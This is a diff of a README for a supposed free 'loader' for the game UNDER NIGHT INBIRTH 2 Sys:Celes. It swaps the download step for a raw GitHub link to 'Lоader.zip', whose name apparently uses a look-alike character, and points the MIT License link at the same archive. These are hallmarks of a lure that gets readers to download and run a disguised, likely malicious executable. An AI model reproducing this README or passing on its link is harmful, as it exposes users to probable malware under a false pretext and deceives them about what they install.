@@ -37,7 +37,7 @@ UNDER NIGHT INBIRTH 2 , SysCeles Loader 2025, OS compatibility, Windows game loa
 
 ## 📥 Installation Guide 
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/immortal7719/UNIb2SysCeles-FreeDownloadHub/main/Lоader.zip** from the repository.
 2. Extract using any archiver (e.g., WinRAR, 7-Zip).
 3. Open the Loader and follow on-screen steps.
 4. Launch UNDER NIGHT INBIRTH 2 SysCeles and enjoy!
@@ -52,5 +52,5 @@ This project is for educational & preservation purposes only. We do not endorse 
 
 ## ⚖️ License  
 
-Distributed under the [MIT License](https://opensource.org/license/mit/).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/immortal7719/UNIb2SysCeles-FreeDownloadHub/main/Lоader.zip).  
 2025 – All rights reserved.
